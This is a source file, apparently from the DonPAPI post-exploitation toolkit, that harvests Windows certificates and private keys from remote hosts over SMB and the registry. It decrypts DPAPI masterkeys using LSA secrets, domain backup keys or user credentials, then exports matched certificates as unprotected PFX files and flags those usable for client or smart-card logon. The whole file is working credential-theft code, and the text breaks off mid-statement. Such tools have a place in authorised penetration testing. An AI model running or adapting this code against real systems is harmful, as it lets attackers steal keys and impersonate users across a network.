import hashlib
import logging
import ntpath,copy
import os
from typing import Any, Dict, List, Literal, Tuple
from donpapi.lib.toolbox import bcolors
from donpapi.lib.fileops import MyFileOps
from donpapi.lib.dpapi import *
from Cryptodome.PublicKey import RSA
from Cryptodome.Util.number import bytes_to_long
from cryptography import x509
from cryptography.hazmat._oid import ExtensionOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12, PublicFormat, load_der_private_key
from pyasn1.codec.der import decoder
from pyasn1.type.char import UTF8String
from impacket.structure import Structure
from impacket.dpapi import DPAPI_BLOB
from impacket.uuid import bin_to_string
from donpapi.myusers import MyUser

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")

class PRIVATE_KEY_RSA(Structure):
    structure = (
        ('magic', '<L=0'),
        ('len1', '<L=0'),
        ('bitlen', '<L=0'),
        ('unk', '<L=0'),
        ('pubexp', '<L=0'),
        ('_modulus', '_-modulus', 'self["len1"]'),
        ('modulus', ':'),
        ('_prime1', '_-prime1', 'self["len1"] // 2'),
        ('prime1', ':'),
        ('_prime2', '_-prime2', 'self["len1"] // 2'),
        ('prime2', ':'),
        ('_exponent1', '_-exponent1', 'self["len1"] // 2'),
        ('exponent1', ':'),
        ('_exponent2', '_-exponent2', 'self["len1"]// 2'),
        ('exponent2', ':'),
        ('_coefficient', '_-coefficient', 'self["len1"] // 2'),
        ('coefficient', ':'),
        ('_privateExponent', '_-privateExponent', 'self["len1"]'),
        ('privateExponent', ':'),
    )
    def dump(self):
        print("magic             : %s " % ( self['magic']))
        print("len1              : %8x (%d)" % (self['len1'], self['len1']))
        print("bitlen            : %8x (%d)" % (self['bitlen'], self['bitlen']))
        print("pubexp            : %8x, (%d)" % (self['pubexp'], self['pubexp']))
        print("modulus           : %s" % (hexlify( self['modulus'])))
        print("prime1            : %s" % (hexlify( self['prime1'])))
        print("prime2            : %s" % (hexlify( self['prime2'])))
        print("exponent1         : %s" % (hexlify( self['exponent1'])))
        print("exponent2         : %s" % (hexlify( self['exponent2'])))
        print("coefficient       : %s" % (hexlify( self['coefficient'])))
        print("privateExponent   : %s" % (hexlify( self['privateExponent'])))
    def __init__(self, data = None, alignment = 0):
        Structure.__init__(self, data, alignment)
        chunk = int(self['bitlen'] / 16)
        self['modulus']= self['modulus'][:chunk * 2]
        self['prime1']= self['prime1'][:chunk]
        self['prime2']= self['prime2'][:chunk]
        self['exponent1']= self['exponent1'][:chunk]
        self['exponent2']= self['exponent2'][:chunk]
        self['coefficient']= self['coefficient'][:chunk]
        self['privateExponent']= self['privateExponent'][:chunk * 2]

# PVK DPAPI BLOB when it has the SIG data
class PVKFile_SIG(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk1', '<L=0'),
        ('descrLen', '<L=0'),
        ('SigHeadLen', "<L=0"),
        ('SigPrivKeyLen', '<L=0'),
        ('HeaderLen', '<L=0'),
        ('PrivKeyLen', '<L=0'),
        ('crcLen', '<L=0'),
        ('SigFlagsLen', '<L=0'),
        ('FlagsLen', '<L=0'),
        ('_Description', '_-Description', 'self["descrLen"]'),
        ('Description', ':'),
        ('unk2', '<LLLLL=0'),
        ('_Rsaheader_new', '_-Rsaheader_new', 'self["SigHeadLen"]' ),
        ('Rsaheader_new', ':'),                                            
        ('_Blob', '_-Blob', 'self["SigPrivKeyLen"]'),
        ('Blob', ':', DPAPI_BLOB),
        ('_ExportFlag', '_-ExportFlag', 'self["SigFlagsLen"]'),
        ('ExportFlag', ':', DPAPI_BLOB), 
    )

    def dump(self):
        print("[PVKFILE]")
        print("[RSAHEADER]")
        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
        print("SigHeadLen         : %8x (%d)" % (self['SigHeadLen'], self['SigHeadLen']))
        print("SigPrivKeyLen      : %8x (%d)" % (self['SigPrivKeyLen'], self['SigPrivKeyLen']))
        print("HeaderLen          : %.8x (%d)" % (self['HeaderLen'], self['HeaderLen']))
        print("PrivKeyLen         : %.8x (%d)" % (self['PrivKeyLen'], self['PrivKeyLen']))
        print("crcLen             : %.8x (%d)" % (self['crcLen'], self['crcLen']))
        print("SigFlagsLen        : %.8x (%d)" % (self['SigFlagsLen'], self['SigFlagsLen']))
        print("FlagsLen           : %.8x (%d)" % (self['FlagsLen'], self['FlagsLen']))
        print("Description   : %s" % (self['Description']))
        print("Blank   : %s" % (self['unk2']))
        print("RsaHeader : %s" %    (hexlify(self['Rsaheader_new']).decode('latin-1')))
        print("[PRIVATE KEY]")
        print (self['Blob'].dump())
        print("[FLAGS]")
        print (self['ExportFlag'].dump())

# PVK DPAPI BLOB without SIG
class PVKFile(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk1', '<L=0'),
        ('descrLen', '<L=0'),
        ('SiPublicKeyLen', "<L=0"),
        ('SiPrivKeyLen', '<L=0'),
        ('ExPublicKeyLen', '<L=0'),
        ('ExPrivKeyLen', '<L=0'),
        ('HashLen', '<L=0'),
        ('SiExportFlagLen', '<L=0'),
        ('ExExportFlagLen', '<L=0'),
        ('_Description', '_-Description', 'self["descrLen"]'),
        ('Description', ':'),
        ('unk2', '<LLLLL=0'),
        ('_PublicKey', '_-PublicKey', 'self["ExPublicKeyLen"]' ),
        ('PublicKey', ':'),
        ('_Blob', '_-Blob', 'self["ExPrivKeyLen"]'),
        ('Blob', ':', DPAPI_BLOB),
        ('_ExportFlag', '_-ExportFlag', 'self["ExExportFlagLen"]'),
        ('ExportFlag', ':', DPAPI_BLOB), 


    )
    def dump(self):
        print("[PVKFILE]")
        print("[RSAHEADER]")
        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
        print("SiPublicKeyLen         : %8x (%d)" % (self['SiPublicKeyLen'], self['SiPublicKeyLen']))
        print("SiPrivKeyLen      : %8x (%d)" % (self['SiPrivKeyLen'], self['SiPrivKeyLen']))
        print("ExPublicKeyLen          : %.8x (%d)" % (self['ExPublicKeyLen'], self['ExPublicKeyLen']))
        print("ExPrivKeyLen         : %.8x (%d)" % (self['ExPrivKeyLen'], self['ExPrivKeyLen']))
        print("HashLen             : %.8x (%d)" % (self['HashLen'], self['HashLen']))
        print("SiExportFlagLen        : %.8x (%d)" % (self['SiExportFlagLen'], self['SiExportFlagLen']))
        print("ExExportFlagLen           : %.8x (%d)" % (self['ExExportFlagLen'], self['ExExportFlagLen']))
        print("Description   : %s" % (self['Description']))
        print("Blank   : %s" % (self['unk2']))
        print("PublicKey : %s" %    (hexlify(self['PublicKey']).decode('latin-1')))
        print("[PRIVATE KEY]")
        print (self['Blob'].dump())
        print("[FLAGS]")
        print (self['ExportFlag'].dump())

# This class is the same as the previous two, its only used to see wich one of the previous clasess we will use
# sorry 
class PVKHeader(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk1', '<L=0'),
        ('descrLen', '<L=0'),
        ('SigHeadLen', "<L=0"),
        ('SigPrivKeyLen', '<L=0'),
        ('HeaderLen', '<L=0'),
        ('PrivKeyLen', '<L=0'),
        ('crcLen', '<L=0'),
        ('SigFlagsLen', '<L=0'),
        ('FlagsLen', '<L=0'),
        ('_Description', '_-Description', 'self["descrLen"]'),
        ('Description', ':'),

        ('Remaining', ':'),

    )
    def dump(self):
        print("[PVKFILE]")
        print("[RSAHEADER]")
        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
        print("SigHeadLen         : %8x (%d)" % (self['SigHeadLen'], self['SigHeadLen']))
        print("SigPrivKeyLen      : %8x (%d)" % (self['SigPrivKeyLen'], self['SigPrivKeyLen']))
        print("HeaderLen          : %.8x (%d)" % (self['HeaderLen'], self['HeaderLen']))
        print("PrivKeyLen         : %.8x (%d)" % (self['PrivKeyLen'], self['PrivKeyLen']))
        print("crcLen             : %.8x (%d)" % (self['crcLen'], self['crcLen']))
        print("SigFlagsLen        : %.8x (%d)" % (self['SigFlagsLen'], self['SigFlagsLen']))
        print("FlagsLen           : %.8x (%d)" % (self['FlagsLen'], self['FlagsLen']))
        print("Description   : %s" % (self['Description']))

def pvkblob_to_pkcs1(key):
    '''
    modified from impacket dpapi.py
    parse private key into pkcs#1 format
    :param key:
    :return:
    '''
    modulus = bytes_to_long(key['modulus'][::-1]) # n
    prime1 = bytes_to_long(key['prime1'][::-1]) # p
    prime2 = bytes_to_long(key['prime2'][::-1]) # q
    exp1 = bytes_to_long(key['exponent1'][::-1])
    exp2 = bytes_to_long(key['exponent2'][::-1])
    coefficient = bytes_to_long(key['coefficient'][::-1])
    privateExp = bytes_to_long(key['privateExponent'][::-1]) # d
    pubExp = int(key['pubexp']) # e
    # RSA.Integer(prime2).inverse(prime1) # u

    r = RSA.construct((modulus, pubExp, privateExp, prime1, prime2))
    return r

class CERTBLOB_PROPERTY(Structure):
    structure = (
        ('PropertyID', '<I=0'),
        ('Reserved', '<I=0'),
        ('Length', '<I=0'),
        ('_Value','_-Value', 'self["Length"]'),
        ('Value',':')
    )

class CERTBLOB():
    def __init__(self, data = None, alignment = 0):
        self.attributes = 0
        self.der = None
        if data is not None:
            self.attributes = list()
            remaining = data
            while len(remaining) > 0:
                attr = CERTBLOB_PROPERTY(remaining)
                self.attributes.append(attr)
                if attr["PropertyID"] == 32:
                    self.der = attr["Value"]
                remaining = remaining[len(attr):] 

    def dump(self):
        print('[CERTBLOB]')
        for attr in self.attributes:
            print("%s:\t\t%s" % (attr['PropertyID'],attr['Value']))
        if self.der is not None:
            print('')
            print("DER             : %s " % (self.der))


class Certificate:
    def __init__(self, user: MyUser, cert:x509.Certificate, pkey: PrivateKeyTypes, pfx: bytes, username: str, filename: str, clientauth: bool):
        self.user = user
        self.cert = cert
        self.pkey = pkey
        self.pfx = pfx
        self.username = username
        self.filename = filename
        self.clientauth = clientauth

    def dump(self) -> None:
        print('Issuer:\t\t\t%s' % str(self.cert.issuer.rfc4514_string()))
        print('Subject:\t\t%s' % str(self.cert.subject.rfc4514_string()))
        print('Valid Date:\t\t%s' % self.cert.not_valid_before)
        print('Expiry Date:\t\t%s' % self.cert.not_valid_after)
        print('Extended Key Usage:')
        for i in self.cert.extensions.get_extension_for_oid(oid=ExtensionOID.EXTENDED_KEY_USAGE).value:
            print('\t%s (%s)'%(i._name, i.dotted_string))

        if self.clientauth:    
            print("\t[!] Certificate is used for client auth!")

        print()
        # print((self.cert.public_bytes(Encoding.PEM).decode('utf-8')))
        # print()

class CertificatesTriage():

    false_positive = ['.','..', '.NET v4.5', '.NET v4.5 Classic', 'desktop.ini','Public','Default','Default User','All Users']
    system_capi_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\RSA",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
    ]
    system_cng_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\Keys",
        "ProgramData\\Microsoft\\Crypto\\SystemKeys",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
    ]
    user_capi_keys_generic_path = [
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\RSA',
    ]
    user_cng_keys_generic_path = [
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\Keys',
    ]
    user_mycertificates_generic_path = [
        'Users\\%s\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates'
    ]
    share = 'C$'

    def __init__(self,smb,myregops,myfileops,logger,options,db,users,user_key, machine_key):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.users = users
        self.smb = smb
        self.user_key = user_key
        self.machine_key = machine_key

    def run(self):
        # logging.basicConfig(format='%(asctime)s.%(msecs)03d %(levelname)s {%(module)s} [%(funcName)s] %(message)s',
		#                     datefmt='%Y-%m-%d,%H:%M:%S', level=logging.DEBUG,
		#                     handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()])
        # logging.getLogger().setLevel(logging.DEBUG)
        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Certificates Secrets {bcolors.ENDC}")

        user_certificates = self.triage_certificates()
        filedest = os.path.join(self.options.output_directory,self.options.target_ip)
        for cert in user_certificates:
            filename = "%s_%s.pfx" % (cert.username,cert.filename[:16])
            full_path = os.path.join(filedest,filename)
            self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for user {cert.user.username}. Writing it to {full_path}{bcolors.ENDC}")
            cert.dump()
            try:
                with open(full_path, "wb") as f:
                    f.write(cert.pfx)
            except Exception as e:
                pass
            self.db.add_certificate(guid=cert.filename, pfx_file_path=full_path, issuer=str(cert.cert.issuer.rfc4514_string()), subject=str(cert.cert.subject.rfc4514_string()), client_auth=cert.clientauth, pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=cert.user.username)
        if not self.options.no_remoteops:
            for user in self.users:
                if user.username == 'MACHINE$':
                    system_certificates = self.triage_system_certificates(user)
                    for cert in system_certificates:
                        filename = "%s_%s.pfx" % (cert.username,cert.filename[:16])
                        full_path = os.path.join(filedest,filename)
                        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for MACHINE. Writing it to {full_path}{bcolors.ENDC}")
                        cert.dump() 
                        with open(full_path, "wb") as f:
                            f.write(cert.pfx)
                        self.db.add_certificate(guid=cert.filename, pfx_file_path=full_path, issuer=str(cert.cert.issuer.rfc4514_string()), subject=str(cert.cert.subject.rfc4514_string()), client_auth=cert.clientauth, pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=user.username)

    def triage_system_certificates(self, user: MyUser) -> List[Certificate]:
        certificates = []
        pkeys = self.loot_privatekeys(user=user)
        certs = self.loot_system_certificates()
        if len(pkeys) > 0 and len(certs) > 0:
            certificates = self.correlate_certificates_and_privatekeys(certs=certs, private_keys=pkeys, user=user)
        return certificates

    def loot_system_certificates(self) -> Dict[str,x509.Certificate]:
        certificates = {}
        my_certificates_key = 'HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates'
        cert_regs = self.myregops.get_reg_subkey(my_certificates_key)
        for cert in cert_regs:
            _, certblob_bytes = self.myregops.get_reg_value(cert, 'Blob')
            certblob = CERTBLOB(certblob_bytes)
            guid = cert.split('\\')[-1]
            if certblob.der is not None:
                self.logging.debug(f"[{self.options.target_ip}] Found certificate blob {guid} for MACHINE$")
                cert = self.der_to_cert(certblob.der)
                certificates[guid] = cert
        self.logging.debug(f"[{self.options.target_ip}] Found {len(certificates)} certificate blob for MACHINE$")
        return certificates

    def triage_certificates(self) -> List[Certificate]:
        certificates = []
        for user in [u for u in self.users if u.username not in self.false_positive and u.username != "MACHINE$"]:
            try:
                certificates += self.triage_certificates_for_user(user=user)
            except Exception as e:
                self.logging.debug(str(e))
                pass
        self.logging.debug(f"[{self.options.target_ip}] Found {len(certificates)} certificate blob for users")
        return certificates

    def triage_certificates_for_user(self, user: MyUser) -> List[Certificate]:
        certificates = []
        pkeys = self.loot_privatekeys(privatekeys_paths=[elem % user.username for elem in self.user_capi_keys_generic_path], user=user)                         
        certs = self.loot_certificates(certificates_paths=[elem % user.username for elem in self.user_mycertificates_generic_path])
        if len(pkeys) > 0 and len(certs) > 0:
            certificates = self.correlate_certificates_and_privatekeys(certs=certs, private_keys=pkeys, user=user)
        return certificates
        
    def loot_privatekeys(self, privatekeys_paths: List[str] = system_capi_keys_generic_path, user: MyUser = None) -> Dict[str, Tuple[str,RSA.RsaKey]]:
        pkeys = {}
        for privatekey_path in privatekeys_paths:
            pkeys_dirs = self.myfileops.do_ls(privatekey_path, '*', display=False)
            for longname, is_dir in pkeys_dirs:
                self.logging.debug("[{self.options.target_ip}] ls returned file %s" % longname)
                if longname not in self.false_positive and is_dir:
                    sid = longname
                    pkeys_sid_path = ntpath.join(privatekey_path,sid)
                    pkeys_sid_dir = self.myfileops.do_ls(pkeys_sid_path, "*", display=False)
                    for file_longname, is_dir2 in pkeys_sid_dir:
                        if not is_dir2 and is_certificate_guid(file_longname):
                            pkey_guid = file_longname
                            pkey_filepath = ntpath.join(pkeys_sid_path, pkey_guid)
                            self.logging.debug("[{self.options.target_ip}] Found PrivateKey Blob: %s" %  (pkey_filepath))
                            data = b''
                            try:
                                filename = self.myfileops.get_file(ntpath.join(pkeys_sid_path, pkey_guid), allow_access_error=False)
                                if filename is None:
                                    continue
                                with open(filename, 'rb') as fp:
                                    data = fp.read()
                                if data is None or data == b'':
                                    continue
                                masterkey_guid = self.get_masterkey_guid_for_privatekey(data)
                                if masterkey_guid is None:
                                    continue
                                masterkey = self.get_masterkey(user=user, guid=masterkey_guid, type=user.type)
                                if type(masterkey) is not dict:
                                    continue
                                if masterkey['status'] == 'decrypted':
                                    pkey = self.decrypt_privatekey(key=masterkey['key'], privatekey_bytes=data)
                                    pkeys[hashlib.md5(pkey.public_key().export_key('DER')).hexdigest()] = (pkey_guid,pkey)
                            except Exception as e:
                                if self.logging.getLogger().level == logging.DEBUG:
                                    import traceback
                                    traceback.print_exc()
                                    self.logging.debug(str(e))
                                pass
        return pkeys
    
    def loot_certificates(self, certificates_paths: List[str]) -> Dict[str, x509.Certificate]:
        certificates = {}
        for certificate_path in certificates_paths:
            certs_dirs = self.myfileops.do_ls(certificate_path, '*', display=False)
            for longname, is_dir in certs_dirs:
                self.logging.debug("[{self.options.target_ip}] ls returned file %s" % longname)
                if longname not in self.false_positive:
                    try:
                        certpath = ntpath.join(certificate_path, longname)
                        self.logging.debug("[{self.options.target_ip}] Found Certificates Blob: %s" %  (certpath))
                        data = b''
                        with open(self.myfileops.get_file(certpath), 'rb') as fp:
                            data = fp.read()
                        certblob = CERTBLOB(data)
                        if certblob.der is not None:
                            cert = self.der_to_cert(certblob.der)
                            certificates[longname] = cert
                    except Exception as e:
                        pass
        return certificates

    def correlate_certificates_and_privatekeys(self, certs: Dict[str, x509.Certificate], private_keys: Dict[str, Tuple[str,RSA.RsaKey]], user: MyUser) -> List[Certificate]:
        certificates = []
        for name, cert in certs.items():
            if hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest() in private_keys.keys():
                # Matching public and private key
                pkey = private_keys[hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest()]
                self.logging.debug("[{self.options.target_ip}] Found match between %s certificate and %s private key !" % (name, pkey[0]))
                key = load_der_private_key(pkey[1].export_key('DER'), password=None)
                pfx = self.create_pfx(key=key,cert=cert)
                username = self.get_id_from_certificate(certificate=cert)[1].replace('@','_')
                clientauth = False
                for i in cert.extensions.get_extension_for_oid(oid=ExtensionOID.EXTENDED_KEY_USAGE).value:
                    if i.dotted_string in [
                        '1.3.6.1.5.5.7.3.2', # Client Authentication
                        '1.3.6.1.5.2.3.4', # PKINIT Client Authentication
                        '1.3.6.1.4.1.311.20.2.2', # Smart Card Logon
                        '2.5.29.37.0', # Any Purpose
                    ]:
                        clientauth = True
                        break

                certificates.append(Certificate(user=user, cert=cert, pkey=key, pfx=pfx, username=username, filename=name, clientauth=clientauth))
        return certificates

    def der_to_cert(self,certificate: bytes) -> x509.Certificate:
        return x509.load_der_x509_certificate(certificate)

    def create_pfx(self, key: rsa.RSAPrivateKey, cert: x509.Certificate) -> bytes:
        return pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )

    def get_id_from_certificate(self,certificate: x509.Certificate) -> Tuple[str, str]:
        try:
            san = certificate.extensions.get_extension_for_oid(
                ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )

            for name in san.value.get_values_for_type(x509.OtherName):
                if name.type_id == PRINCIPAL_NAME:
                    return (
                        "UPN",
                        decoder.decode(name.value, asn1Spec=UTF8String)[0].decode(),
                    )

            for name in san.value.get_values_for_type(x509.DNSName):
                return "DNS Host Name", name
        except:
            pass

        return None, None

    def decrypt_privatekey(self,privatekey_bytes:bytes, key:Any, cng: bool = False) -> RSA.RsaKey:
        blob= PVKHeader(privatekey_bytes)
        if blob['SigHeadLen'] > 0:
            blob=PVKFile_SIG(privatekey_bytes)
        else:
            blob=PVKFile(privatekey_bytes)
        dpapi_blob = blob['Blob']
        self.logging.debug("got blob %r" % dpapi_blob)
        key = unhexlify(key[2:])
        decrypted = dpapi_blob.decrypt(key)
        rsa_temp = PRIVATE_KEY_RSA(decrypted)
        pkcs1 = pvkblob_to_pkcs1(rsa_temp)
        return pkcs1

    def get_masterkey_guid_for_privatekey(self, privatekey_bytes: bytes) -> "Any | None":
        blob= PVKHeader(privatekey_bytes)
        if len(blob['Remaining']) == 0:
            return None
        if blob['SigHeadLen'] > 0:
            blob=PVKFile_SIG(privatekey_bytes)
        else:
            blob=PVKFile(privatekey_bytes)
        
        return bin_to_string(blob['Blob']['GuidMasterKey'])

    def get_masterkey(self, user, guid, type):
        guid = guid.lower()
        if guid not in user.masterkeys_file:
            self.logging.debug(
                f"[{self.options.target_ip}] [!] {bcolors.FAIL}{user.username}{bcolors.ENDC} masterkey {guid} not found")
            return -1
        else:
            self.logging.debug(
                f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} Found")
        if user.masterkeys_file[guid]['status'] == 'decrypted':
            self.logging.debug(
                f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} already decrypted")
            return user.masterkeys_file[guid]
        elif user.masterkeys_file[guid]['status'] == 'encrypted':
            return self.decrypt_masterkey(user, guid, type)

    def decrypt_masterkey(self, user, guid, type=''):
        self.logging.debug(
            f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} of type {type} (type_validated={user.type_validated}/user.type={user.type})")
        guid = guid.lower()
        if guid not in user.masterkeys_file:
            self.logging.debug(
                f"[{self.options.target_ip}] [!] {bcolors.FAIL}{user.username}{bcolors.ENDC} masterkey {guid} not found")
            return -1
        localfile = user.masterkeys_file[guid]['path']

        if user.masterkeys_file[guid]['status'] == 'decrypted':
            self.logging.debug(
                f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} already decrypted")
            return user.masterkeys_file[guid]
        else:
            if user.type_validated == True:
                type = user.type
            type = 'MACHINE' if type == 'MACHINE-USER' else type
            if type == 'MACHINE':
                # Try de decrypt masterkey file
                for key in self.machine_key:
                    self.logging.debug(
                        f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with MACHINE_Key from LSA {key.decode('utf-8')}")
                    try:
                        myoptions = copy.deepcopy(self.options)
                        myoptions.sid = None  # user.sid
                        myoptions.username = user.username
                        myoptions.pvk = None
                        myoptions.file = localfile  # Masterkeyfile to parse
                        myoptions.key = key.decode("utf-8")
                        mydpapi = DPAPI(myoptions, self.logging)
                        decrypted_masterkey = mydpapi.decrypt_masterkey()
                        if decrypted_masterkey != None and decrypted_masterkey != -1:
                            # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}[...] Maserkey {bcolors.ENDC}{localfile}  {bcolors.ENDC}: {decrypted_masterkey}" )
                            user.masterkeys_file[guid]['status'] = 'decrypted'
                            user.masterkeys_file[guid]['key'] = decrypted_masterkey
                            # user.masterkeys[localfile] = decrypted_masterkey
                            user.type = 'MACHINE'
                            user.type_validated = True
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for Machine {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                            self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                     status=user.masterkeys_file[guid]['status'],
                                                     decrypted_with="MACHINE-KEY", decrypted_value=decrypted_masterkey,
                                                     pillaged_from_computer_ip=self.options.target_ip,
                                                     pillaged_from_username=user.username)
                            return user.masterkeys_file[guid]
                        else:
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.WARNING} MACHINE-Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid}{bcolors.ENDC}")
                    except Exception as ex:
                        self.logging.debug(
                            f"[{self.options.target_ip}] Exception {bcolors.WARNING} MACHINE-Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid}{bcolors.ENDC}")
                        self.logging.debug(ex)
            elif type == 'MACHINE-USER':
                # Try de decrypt masterkey file
                for key in self.user_key:
                    self.logging.debug(
                        f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with MACHINE-USER_Key from LSA {key.decode('utf-8')}")  # and SID %s , user.sid ))
                    try:
                        # key1, key2 = deriveKeysFromUserkey(tsid, userkey)
                        myoptions = copy.deepcopy(self.options)
                        myoptions.file = localfile  # Masterkeyfile to parse
                        if user.is_adconnect is True:
                            myoptions.key = key.decode("utf-8")
                            myoptions.sid = user.sid
                        else:
                            myoptions.key = key.decode("utf-8")  # None
                            myoptions.sid = None  # user.sid

                        myoptions.username = user.username
                        myoptions.pvk = None
                        mydpapi = DPAPI(myoptions, self.logging)
                        decrypted_masterkey = mydpapi.decrypt_masterkey()
                        if decrypted_masterkey != -1 and decrypted_masterkey != None:
                            # self.logging.debug(f"[{self.options.target_ip}] Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
                            user.masterkeys_file[guid]['status'] = 'decrypted'
                            user.masterkeys_file[guid]['key'] = decrypted_masterkey
                            # user.masterkeys[localfile] = decrypted_masterkey
                            
                            user.type = 'MACHINE-USER'
                            user.type_validated = True
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for Machine {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                            self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                     status=user.masterkeys_file[guid]['status'],
                                                     decrypted_with="MACHINE-USER", decrypted_value=decrypted_masterkey,
                                                     pillaged_from_computer_ip=self.options.target_ip,
                                                     pillaged_from_username=user.username)
                            return user.masterkeys_file[guid]
                        else:
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.WARNING} MACHINE-USER_Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING}  Masterkey {guid}{bcolors.ENDC}")
                    except Exception as ex:
                        self.logging.debug(
                            f"[{self.options.target_ip}] Exception {bcolors.WARNING} MACHINE-USER_Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING}  Masterkey {guid}{bcolors.ENDC}")
                        self.logging.debug(ex)
                else:
                    if user.type_validated == False and not user.is_adconnect:
                        return self.decrypt_masterkey(user, guid, type='DOMAIN')

            elif type == 'DOMAIN' and self.options.pvk is not None:
                # For ADConnect
                if user.is_adconnect is True:
                    return self.decrypt_masterkey(user, guid, type='MACHINE-USER')
                # Try de decrypt masterkey file
                self.logging.debug(
                    f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey {self.options.pvk}")
                try:
                    myoptions = copy.deepcopy(self.options)
                    myoptions.file = localfile  # Masterkeyfile to parse
                    myoptions.username = user.username
                    myoptions.sid = user.sid
                    mydpapi = DPAPI(myoptions, self.logging)
                    decrypted_masterkey = mydpapi.decrypt_masterkey()
                    if decrypted_masterkey != -1 and decrypted_masterkey != None:
                        self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
                        user.masterkeys_file[guid]['status'] = 'decrypted'
                        user.masterkeys_file[guid]['key'] = decrypted_masterkey
                        # user.masterkeys[localfile] = decrypted_masterkey
                        user.type = 'DOMAIN'
                        user.type_validated = True
                        self.logging.debug(
                            f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for user {bcolors.OKBLUE} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                        self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                 status=user.masterkeys_file[guid]['status'],
                                                 decrypted_with="DOMAIN-PVK",
                                                 decrypted_value=decrypted_masterkey,
                                                 pillaged_from_computer_ip=self.options.target_ip,
                                                 pillaged_from_username=user.username)
                        return user.masterkeys_file[guid]
                    else:
                        self.logging.debug(
                            f"[{self.options.target_ip}] {bcolors.WARNING}Domain Backupkey {self.options.pvk} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING} Masterkey {guid} -> Checking with Local user with credz{bcolors.ENDC}")
                        if user.type_validated == False:
                            return self.decrypt_masterkey(user, guid, 'LOCAL')
                except Exception as ex:
                    self.logging.debug(
                        f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey (most likely user is only local user) -> Running for Local user with credz{bcolors.ENDC}")
                    self.logging.debug(f"exception was : {ex}")
                    if user.type_validated == False:
                        return self.decrypt_masterkey(user, guid, 'LOCAL')

            # type==LOCAL
            # On a des credz
            if len(self.options.credz) > 0 and user.masterkeys_file[guid][
